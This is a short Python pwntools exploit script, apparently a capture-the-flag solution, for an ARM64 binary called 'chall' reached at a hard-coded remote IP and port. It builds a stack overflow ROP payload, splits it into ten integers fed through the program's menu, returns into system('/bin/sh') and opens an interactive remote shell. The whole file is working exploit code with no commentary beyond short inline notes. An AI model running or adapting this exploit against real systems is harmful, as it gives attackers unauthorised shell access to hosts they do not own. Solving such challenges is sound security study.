from pwn import *

context.binary = elf = ELF('./chall')

pr = remote('83.136.252.13',51780)

rop = ROP(elf)
print(rop.gadgets)

#0x4007ac:ldr x8,[sp,8];mov x0,x8; bl #0x406f28
payload = b'a'*0x2c #buffer
payload += p64(0) #x29:0
payload += p64(0x4007ac) #X30: 0x4007ac
payload += p64(0xdeadbeef) #buffer bytes
payload += p64(next(elf.search(b'/bin/sh\x00'))) #x8: /bin/sh
payload += p32(0)
number_to_send = []
for i in range(10):
    number_to_send.append(int.from_bytes(payload[i*8:i*8+8], 'little')) #0x4007ac + i for 10 times
print(len(number_to_send))
print(number_to_send)
pr.sendline(b'1')
pr.sendline(b'10')
for num in number_to_send:
    pr.sendline(str(num).encode()) # send 10 numbers to overwrite the stack

pr.sendline(b'5') # ret to system('/bin/sh')
pr.interactive()